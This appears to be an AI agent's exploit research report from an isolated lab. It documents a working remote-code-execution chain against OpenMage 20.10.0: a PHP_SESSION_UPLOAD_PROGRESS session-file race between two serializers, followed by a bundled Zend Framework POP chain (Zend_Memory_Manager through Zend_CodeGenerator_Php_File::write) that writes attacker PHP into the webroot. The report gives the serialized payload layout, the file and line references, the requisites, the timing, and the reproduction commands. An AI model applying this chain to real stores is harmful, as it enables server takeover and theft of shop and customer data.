# OpenMage 20.10.0 — `PHP_SESSION_UPLOAD_PROGRESS` session injection → bundled ZF1 POP chain → RCE

**Receipt:** `/tmp/opencode/research/openmage_pop_20261022T021222Z/`
**Date:** 2026-10-22
**Target:** stock OpenMage 20.10.0 tree, PHP 8.5.10 FPM, private loopback lab
**Binaries:** NP `install_realapps_np/sbin/php-fpm` (md5 `4ee099823b75e16ea36f93c71d57bfd8`) and
PIE `install_realapps/sbin/php-fpm` (md5 `26e4c7c37b8ec17659035052457694d2`, ELF 64-bit LSB **pie executable**)

---

## 0. Verdict

| Claim | Result |
|---|---|
| `PHP_SESSION_UPLOAD_PROGRESS` can inject a `|`-bearing key into a live session file under stock PHP 8.5.10 defaults (`upload_progress.enabled=1`, `cleanup=On`) | **YES**, but only while the upload is in flight (slow upload). Complete and aborted uploads lose the entry (T1/T3). |
| A *single* stock `php`-serializer writer can create that key | **NO.** The `php` encoder rejects `|` in the key (`Data contains invalid key ...`) and leaves a 0-byte session file (control C1′). |
| A writer using `session.serialize_handler=php_serialize` on the same `save_path` can | **YES.** It length-encodes the key and embedded NULs verbatim. |
| The application's `session_start()` (stock `php` handler) deserializes attacker bytes and autoloads classes | **YES** (T2: `TestClass::__wakeup`/`__destruct`, markers, app worker PID). |
| A **stock** POP chain in the bundled `shardj/zf1-future` reaches arbitrary file write → PHP → RCE | **YES**: `Zend_Memory_Manager::__destruct` → `Zend_Cache_Backend_Apc::clean` → `_log` → `Zend_Log::log` → `Zend_CodeGenerator_Php_File::write` → `file_put_contents`. |
| PHPGGC `Magento/FW1` works | **NO** — it needs `Varien_Cache_Backend_Eaccelerator`, absent from OpenMage 20.10.0. |
| PHPGGC `ZendFramework/RCE1` works | **NO** — `preg_replace /e`, rejected by zf1-future. |
| PHPGGC `ZendFramework/FD1` works | **YES but only file delete**, not RCE. |
| PIE-independent (no binary base, no leak, no ROP) | **YES** — byte-identical payload runs on both NP and PIE; markers record `PHP_BINARY`. |

**Operational bottom line:** the exploit is a *cross-serializer* session-file race:
a `php_serialize` writer (e.g. any second PHP endpoint/service sharing `session.save_path`) writes
`a:1:{s:<n>:"upload_progress_x|<serialized gadget>";a:5:{...}}` mid-upload; the stock app
(`php` handler) splits at the first `|`, unserializes the gadget, then fails on the trailing
progress array — `php_session_cancel_decode()` destroys the session and, during teardown, the
gadget's `__destruct` writes an attacker-controlled PHP file into the webroot. The app returns
its 503 error page; the write has already happened.

---

## 1. Lab and environment

### 1.1 Isolation

The lab is a **copy** of `stock_20261022T013022Z/www` (189 MB) into this receipt. No file, process,
port or session directory of the old lab (`28895`, master `1663851`, worker `1682840`) was modified
or restarted. WP labs `28891/28893` and the MediaWiki lab (`1666498`) were not touched.

| Component | PID | Port / socket | Notes |
|---|---|---|---|
| nginx NP | 1707605 (worker 1707606) | 127.0.0.1:**28896** | `conf/nginx.np.conf` |
| nginx PIE | 1707608 (worker 1707609) | 127.0.0.1:**28897** | `conf/nginx.pie.conf` |
| FPM NP master | **1707330** | unix `run/app_np.sock`, `run/writer_np.sock`, `run/writer_stock_np.sock` | `conf/fpm.np.conf` |
| FPM PIE master | **1707337** | unix `run/app_pie.sock`, `run/writer_pie.sock` | `conf/fpm.pie.conf` |

Pools:

| Pool | Binary | `session.serialize_handler` | `session.save_path` | Purpose |
|---|---|---|---|---|
| `app_np` / `app_pie` | NP / PIE | **`php`** (default) | OpenMage `var/session` | the victim application (`Mage::getSingleton('core/session',['name'=>'om_frontend'])->start()`) |
| `writer_np` / `writer_pie` | NP / PIE | **`php_serialize`** | same `www/var/session` | upload endpoint (deployment delta; the sink does **not** call `session_start()`) |
| `writer_stock_np` | NP | `php` (default) | same dir | single-handler control C1′ |

`www/lib/TestClass.php` is a **lab-only** class (not part of OpenMage) used solely to prove
autoload + magic-method execution during the app's `session_start()`.

### 1.2 PHP defaults (no php.ini loaded)

`phase/ini_defaults_np.txt`, `phase/ini_defaults_pie.txt`:

```
PHP 8.5.10 (cli) (NTS)          loaded_ini=(none)
session.serialize_handler='php'         session.use_strict_mode='0'
session.use_only_cookies='1'            session.name='PHPSESSID'
session.upload_progress.enabled='1'     session.upload_progress.cleanup='1'
session.upload_progress.prefix='upload_progress_'
session.upload_progress.name='PHP_SESSION_UPLOAD_PROGRESS'
session.upload_progress.freq='1%'       session.upload_progress.min_freq='1'
session.save_path=''  -> OpenMage calls session_save_path(Mage::getBaseDir('session'))
                         = <root>/www/var/session   (Mage_Core_Model_Session_Abstract_Varien:89,386)
```

### 1.3 Injection mechanics

* `ext/session/session.c` (PHP 8.5.10 source copy in `phpsessinj_1792633613/session.c`):
  * rfc1867 handler builds the key with `smart_str_appendl(&progress->key, *data->value, value_len)`
    (**length-based**, line ~3318) → NUL and `|` survive;
  * `PS_SERIALIZER_ENCODE_FUNC(php)` (line ~1099) refuses `|` in the key → C1′;
  * `PS_SERIALIZER_DECODE_FUNC(php)` (line ~1133) splits at the **first** `|`, then
    `php_var_unserialize()` on the remainder; trailing bytes make the decode return `FAILURE`;
  * `php_session_cancel_decode()` → `php_session_destroy()` + warning
    `Failed to decode session object. Session has been destroyed` (line ~267).
* OpenMage `Mage_Core_Model_Session_Abstract_Varien::start()` calls `session_start()` at line 156;
  on `false`/`Throwable` it calls `session_abort()` and renders the 503 page (lines 159–171).
* The gadget object is instantiated **before** the trailing bytes cause `FAILURE`; destroying it
  during `php_session_destroy()`/var-hash teardown fires `__destruct`. This is why the request
  returns 503 while the arbitrary write still happens (reports `1150872001564`, `1170591060916`,
  `1141909199890` show `Zend_Log->__destruct()` in the `session_start()` frame).

---

## 2. Step 1 — injection, cleanup and autoload

### 2.1 C1′ — single stock `php` writer (control): rejected

`phase/upload_c1stock_complete.log`, `phase/c1stock_warning.txt`

```
POST /lab_upload_stock.php  200  (65536-byte upload, field: x|O:9:"TestClass":0:{})
after-complete: size=0 sha256=e3b0c44298fc1c14...  (empty session file)
PHP Warning: PHP Request Startup: Failed to write session data.
  Data contains invalid key "upload_progress_x|O:9:"TestClass":0:{}"
```

→ A single stock handler cannot produce the injected key. **The literal single-handler premise is false.**

### 2.2 T1 — complete upload, `cleanup=On` (default): no window

`phase/upload_t1complete_complete.log`

```
BODY prefix=252 file=1048576 ... total=1048857 payload_len=22
after-complete: size=6 sha256=35786c7117b4e38d head=b'a:0:{}'
```

The `MULTIPART_EVENT_END` cleanup removes the progress entry at request end. A reader that
arrives afterwards sees `a:0:{}` (and `php`-handler decode of that is itself invalid — no `|` —
so `session_start()` fails). No marker.

### 2.3 T2 — slow upload (paused at 262144/1048576): injection + app autoload

`scripts/t2_retry.sh`, `phase/t2retry_upload.out`, `phase/t2retry_sess_at_read.bin`

Live session file while the upload was paused (writer `php_serialize`), 358 bytes,
sha256 `9c6d4c94d067e1350b7ec5c6ce89b9e8c16f74310fe671d3133736083ca50128`:

```
a:1:{s:38:"upload_progress_x|O:9:"TestClass":0:{}";a:5:{s:10:"start_time";i:1792636538;...
```

Concurrent app GET (`om_frontend=t2retry`, port 28896): **HTTP 503 in 0.008 s**; immediately:

```
markers/testclass_wakeup.log   2026-10-22T02:35:38+00:00 wakeup   pid=1707332 sapi=fpm-fcgi
markers/testclass_destruct.log 2026-10-22T02:35:38+00:00 destruct pid=1707332 sapi=fpm-fcgi
MARK_WAKEUP, MARK_DESTRUCT (0-byte files, receipt root)
```

PID 1707332 is `app_np` (NP 8.5.10). This proves: injection → app `session_start()` →
autoload → `__wakeup` → teardown `__destruct`.

The file after the request is 6 bytes (`a:0:{}`) — the app's failed decode destroyed the crafted
session, then the upload's END cleanup wrote an empty one.

### 2.4 T3 — abort by RST at 262144: cleanup still fires

`phase/upload_t3abort_abort.log`: `after-abort`/`after-complete` → `a:0:{}`; no marker.
An aborted connection is still an upstream EOF, so rfc1867 END + `cleanup=On` run.

### 2.5 Timing summary

| Phase | Event | Evidence |
|---|---|---|
| 0 ms | writer receives multipart headers, `PHP_SESSION_UPLOAD_PROGRESS` parsed | `BODY prefix=...` |
| first FILE_DATA (1 % step) | progress entry written to `sess_<sid>`; key contains `upload_progress_x|...` | at-read 358 / 1089 / 1086 bytes |
| mid-flight (paused) | app GET → `session_start()` → autoload + `__wakeup`; decode failure → destroy → `__destruct` | 503 in 6–8 ms; marker logs/report |
| request end | rfc1867 END removes progress entry (`cleanup=On`) | `after-complete: a:0:{}` |

---

## 3. Step 2 — stock gadget inventory and POP chain

### 3.1 Inventory (`phase/gadget_scan.txt`)

| Tree | `__destruct` files | `__wakeup` files |
|---|---|---|
| `www/app/code/core` (Mage_/Varien_) | 1 (`Mage_Core_Model_Resource_Session`) | 0 |
| `www/vendor/shardj/zf1-future/library` (Zend_) | 30 | 16 |
| `www/vendor` (all) | 36 | 21 |

The usable stock entry points are in the bundled ZF1Future, not in `Mage_`.

### 3.2 The chain (all classes present in stock OpenMage 20.10.0)

```
Zend_Memory_Manager::__destruct()
  vendor/shardj/zf1-future/library/Zend/Memory/Manager.php:197-202
  -> $this->_backend->clean(Zend_Cache::CLEANING_MODE_MATCHING_TAG, $this->_tags)   (line 200)

Zend_Cache_Backend_Apc::clean($mode, $tags)
  .../Zend/Cache/Backend/Apc.php:145-159
  -> case MATCHING_TAG: $this->_log(Zend_Cache_Backend_Apc::TAGS_UNSUPPORTED_BY_CLEAN_OF_APC_BACKEND)

Zend_Cache_Backend::_log($message, $priority = 4)
  .../Zend/Cache/Backend.php:273-287
  -> if ($this->_directives['logging']) $logger->log($message, 4)

Zend_Log::log($message, $priority)
  .../Zend/Log.php:416-464
  -> priorities/filters checks (payload sets _priorities[4]=1, _filters=[])
  -> foreach ($this->_writers as $writer) $writer->write($event);

Zend_CodeGenerator_Php_File::write()
  .../Zend/CodeGenerator/Php/File.php:458-464
  -> file_put_contents($this->_filename, $this->generate())
     (payload sets _filename, _sourceContent, _isSourceDirty=false)
```

After the write, the same teardown runs `Zend_Log::__destruct()` →
`$writer->shutdown()` (Log.php:366). `Zend_CodeGenerator_Php_File` has no `shutdown()`, so an
`Error` is raised **after** the file is on disk. In a successful standalone decode this is an
uncaught fatal (harmless to the objective); in the injected-session path it is thrown inside
`session_start()` and caught by OpenMage's handler, which renders the 503 page (report
`1150872001564` / `1170591060916` / `1141909199890`).

Payload form (no addresses, no NUL-free constraint; private/protected property mangling is used):

```
O:19:"Zend_Memory_Manager":2:{
  s:29:"\0Zend_Memory_Manager\0_backend"; O:22:"Zend_Cache_Backend_Apc":1:{
    s:14:"\0*\0_directives"; a:2:{s:7:"logging";b:1;s:6:"logger";O:8:"Zend_Log":3:{...}}}
  s:12:"\0*\0_tags"; a:0:{} }
```

### 3.3 Isolated proof (no upload involved)

`phase/pop_iso.bin` (714 bytes, sha256 `c6da7a93dca77212d88bc4e8f50c4184c177d541d613a3f6caf0f1d0f9cc42ee`)
written as `www/var/session/sess_poptest1`; app GET `/` port 28896 returned **200** and
`www/pop_iso.php` (204 bytes) appeared. Requesting `/pop_iso.php` returned `POP_OK` and wrote
`markers/MARK_POP`:

```
POP 2026-10-22T02:17:30+00:00 pid=1707332 sapi=fpm-fcgi
```

### 3.4 PHPGGC controls (the shipped Magento/ZendFramework chains)

Generated with the lab PHP 8.5.10 CLI (`/tmp/opencode/phpggc_openmage`, commit `f8aebde`).
Note: phpggc appends a trailing `0x0a` to every payload; for session embedding it must be stripped
(otherwise the `php` decoder fails on extra data). Controls below were run with stripped payloads
and legal session IDs.

| Chain | Payload | Result in stock OpenMage 20.10.0 | Exact failure |
|---|---|---|---|
| `Magento/FW1` | `phase/gg_fw1.bin` (465 B, newline stripped) | app 200, **no file** | `The script tried to call a method on an incomplete object ... "Varien_Cache_Backend_Eaccelerator"` at `Zend/Memory/Manager.php:200`; class absent (`class_exists` = NO) |
| `ZendFramework/RCE1` | `phase/gg_rce1.bin` (551 B, newline stripped) | app 200, **no file** | `Zend_Filter_Exception: Zend_Filter_PregReplace uses deprecated modifier "/e".` (and a standalone `Zend_Log` has no trigger calling `log()`) |
| `ZendFramework/FD1` | `phase/gg_fd1.bin` (regenerated by `gg_controls.sh`) | app **200**, `www/gg_victim.txt` **deleted** | works, but only arbitrary **delete** (`Zend_Http_Response_Stream::__destruct` → `@unlink`) — not RCE |
| `Magento/SQLI1` | (not executed) | SQL injection via `Credis_Client::__destruct` → `Mage_Sales_Model_Order_Payment_Transaction::close()` | not an RCE chain; needs a live DB/Redis; out of scope |

**Exact missing gadget for PHPGGC `Magento/FW1`:** `Varien_Cache_Backend_Eaccelerator`
(and `Zend_Cache_Backend_Eaccelerator`) do not exist in OpenMage 20.10.0. The stock replacement
used here is `Zend_Cache_Backend_Apc` (present, `clean()` with the same `_log()` path).

---

## 4. Step 3 — end-to-end and PIE proof

### 4.1 NP end-to-end (slow upload → app → POP → web RCE)

* upload: `phase/e2e_upload.out`, sid `poptest2`, writer `writer_np` (worker 1707334, 12.001 s
  `POST` returning 200 in `log/fpm_np.access.log`), target `/lab_upload_sink.php`. The NP
  coordinator shell was interrupted after the app read, so `e2e_upload.out` stops at
  `during-pause`; the server-side access line documents the 12 s request, and the crafted file
  was captured at 1089 bytes before the read;
* live session at read: **1089 bytes**, first bytes
  `a:1:{s:768:"upload_progress_x|O:19:"Zend_Memory_Manager"...`
  (`phase/e2e_sess_at_read.bin`, sha256 `7e57c20ed69a9c49da16972d482ae3013c36c8ea36bf1af47ab302c1c4d0e374`);
* app_get: **503 in 0.005 s**, `log/fpm_np.access.log` line `1707331|0.005|...|GET|503`;
* POP target appeared during that request: `www/pop_e2e.php` 242 B, mtime
  `2026-10-22 04:18:36.449`, sha256 `cc40aa20812b67890ea80930aed38f855721d1a99f46fd499f9b5b3e370fe102`;
* GET `/pop_e2e.php` → `E2E_OK`, marker
  `E2E 2026-10-22T02:18:42+00:00 pid=1707332 sapi=fpm-fcgi uri=/pop_e2e.php`.

### 4.2 PIE isolated + end-to-end

Isolated: `phase/pop_pie_iso.bin` (768 B, sha256 `5cbc24c836c084e1e8e9511a34a7824c6c5f4e3535ab1acec5b1ab262c6111d5`)
→ `www/var/session/sess_pietest1` → app GET 28897 **200** → `www/pop_pie_iso.php` written →
`GET /pop_pie_iso.php` → `PIE_OK`; marker:

```
PIE-ISO 2026-10-22T02:19:27+00:00 pid=1707338 sapi=fpm-fcgi bin=/tmp/opencode/realapps/install_realapps/sbin/php-fpm
```

E2E: `scripts/pie_e2e.sh`, sid `pietest3`, writer `writer_pie` (worker 1707341, 12.002 s
`POST`), at-read **1086 bytes** (`a:1:{s:765:"upload_progress_x|O:19:...`,
`phase/pie_e2e_sess_at_read.bin`), app GET **503 in 0.006 s** (worker 1707338), `www/pop_pie_e2e.php`
235 B, mtime `2026-10-22 04:20:21.612`; GET → `PIE_E2E_OK`; marker:

```
PIE-E2E 2026-10-22T02:20:38+00:00 pid=1707339 sapi=fpm-fcgi bin=/tmp/opencode/realapps/install_realapps/sbin/php-fpm
```

### 4.3 Byte-identical payload on both binaries

`phase/pop_shared.bin` — 745 bytes, sha256
`9eeb7b35624ab897223dcb6891cc36b3c96f1504d49442803327c794928a550d` — contains only class names,
property names, strings and integers. The **same bytes** were copied to `sess_sharednp` and
`sess_sharedpie`:

```
SHARED 2026-10-22T02:30:18+00:00 pid=1707332 sapi=fpm-fcgi bin=/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm
SHARED 2026-10-22T02:30:18+00:00 pid=1707339 sapi=fpm-fcgi bin=/tmp/opencode/realapps/install_realapps/sbin/php-fpm
```

No base address, no leak, no ROP, no binary-specific bytes were used. The chain is PHP-level and
therefore PIE-independent; the only difference is `PHP_BINARY`/PID in the marker.

---

## 5. Step 4 — requisites, blockers, deployment notes

### Requisites (all exercised above)

1. `session.upload_progress.enabled=1` (stock default) with a multipart upload that has a file
   part and a `PHP_SESSION_UPLOAD_PROGRESS` field.
2. A writer whose session serializer preserves arbitrary key bytes — `php_serialize` here.
   (Default `php` rejects `|` at encode time.)
3. Writer and app share `session.save_path` (`var/session` in OpenMage) and the app uses the
   `php` handler (split at `|`, `php_var_unserialize` the remainder).
4. Attacker-chosen/known session id with **legal characters** (`A–Z a–z 0–9 , -`; `_` is rejected
   by PHP: *“Session ID is too long or contains illegal characters”*). The writer request must
   carry that id in the writer's session-name cookie (`PHPSESSID` by default); the app request
   carries it in `om_frontend`.
5. The app must call `session_start()` **while the progress entry is present**. With stock
   `upload_progress.cleanup=On` the entry is removed at request end, so a large/slow upload is
   required to hold the window (T1 complete = no injection; T2 slow = injection).
6. Gadget classes must be autoloadable by the app (all classes here are stock and composer-mapped).
7. A writable target for `file_put_contents` that is web-served with PHP for the final RCE step.

### Blockers / non-working variants

* Single stock `php` writer: key rejected, 0-byte session file (C1′).
* Complete or aborted upload with `cleanup=On`: entry removed (T1/T3).
* App with `php_serialize` handler itself: the injected file decodes as an array whose value is a
  *string*; no object is instantiated → no POP. The victim must use `php` (or another
  `|`-splitting unserializing handler).
* PHPGGC `Magento/FW1`: missing `Varien_Cache_Backend_Eaccelerator`.
* PHPGGC `ZendFramework/RCE1`: `/e` dead on PHP ≥ 7.
* Destroying the app session on decode failure also **deletes** the crafted session file
  (`php_session_destroy`); the write happens during that teardown. This is a one-shot window per
  write, but the upload's next progress update recreates the file.

### Deployment deltas (explicit)

The writer pool in this lab uses `session.serialize_handler=php_serialize` and the shared
`session.save_path`. This is a **second component / deployment assumption**, not a stock
single-process configuration: any PHP endpoint (separate app, upload service, worker) sharing the
session directory and using `php_serialize` provides it. The stock OpenMage app itself is
unchanged (`app_np`/`app_pie` have no session overrides).

---

## 6. Evidence index

| File | Content |
|---|---|
| `scripts/mkpay.py` | serializer/builder for TestClass and the POP payload |
| `scripts/upload_probe.py` | multipart driver (`complete/slow/slow-abort/abort`), live file polling |
| `scripts/get_app.py` | app GET with `Host: 127.0.0.1:28895`, `om_frontend` cookie |
| `scripts/setup.sh` | reproducible configs + start of both masters/nginx |
| `scripts/t2_retry.sh`, `scripts/pie_e2e.sh` | step-1 retry and PIE E2E coordinators |
| `phase/upload_c1stock_complete.log`, `phase/c1stock_warning.txt` | C1′ single-handler rejection |
| `phase/upload_t1complete_complete.log` / `upload_t3abort_abort.log` | complete/abort = no window |
| `phase/t2retry_upload.out`, `phase/t2retry_sess_at_read.bin` | T2 live injection (358 B) + markers |
| `phase/e2e_sess_at_read.bin`, `www/pop_e2e.php` | NP E2E at-read (1089 B) + written payload |
| `phase/pie_e2e_sess_at_read.bin`, `www/pop_pie_e2e.php` | PIE E2E at-read (1086 B) + written payload |
| `phase/pop_shared.bin`, `markers/MARK_SHARED` | byte-identical payload on both binaries |
| `phase/gg_fw1.bin`, `gg_rce1.bin`, `gg_fd1.bin`, `gg_controls.out` | PHPGGC control payloads/results |
| `phase/gadget_scan.txt` | magic-method inventory |
| `phase/reports/` | OpenMage `var/report` records (503 traces incl. destructor frames) |
| `markers/` (`MARK_POP`, `MARK_E2E`, `MARK_PIE`, `MARK_PIE_E2E`, `MARK_SHARED`), root `MARK_WAKEUP`/`MARK_DESTRUCT` | execution markers |
| `log/` | FPM/nginx/php logs (access lines with worker PIDs) |
| `REPORT.md`, `README.md`, `SHA256SUMS` | this report, reproduction notes, hashes |

---

## 7. Reproduction (short)

```bash
R=/tmp/opencode/research/openmage_pop_20261022T021222Z
# 1) lab (already running; recreates configs/start)
$R/scripts/setup.sh
# 2) isolated POP
python3 $R/scripts/mkpay.py pop $R/www/pop_iso.php "<?php echo 'POP_OK'; ?>" $R/phase/pop_iso.bin
cp $R/phase/pop_iso.bin $R/www/var/session/sess_poptest1
python3 $R/scripts/get_app.py 28896 poptest1 / $R/req/pop_iso_reader
# 3) step-1 injection/autoload
$R/scripts/t2_retry.sh
# 4) PIE end-to-end
$R/scripts/pie_e2e.sh && python3 $R/scripts/get_app.py 28897 pietest3 /pop_pie_e2e.php $R/req/pie_exec
# 5) controls
$R/scripts/gg_controls.sh   # note: use legal sids and strip the trailing newline
```

## 8. Limitations and non-goals

* The exploit needs the mid-upload read window. With a fast local upload and no pause, the window
  is milliseconds; a real deployment needs a large file or a slow client. Complete/aborted
  uploads do not work under `cleanup=On`.
* The PHPGGC `Magento/FW1` failure is a genuine stock-version mismatch, not a lab artifact; the
  substitution with `Zend_Cache_Backend_Apc` is the actual stock chain.
* `session.use_strict_mode=1` was not tested; the crafted session file exists at read time, but
  the files handler's strict validation may behave differently. All runs here used the stock
  default `0`.
* No repository commit was made. Shared services (old OpenMage lab 28895, WP 28891/28893,
  MediaWiki 1666498) were not touched. The private lab processes are left running for inspection.
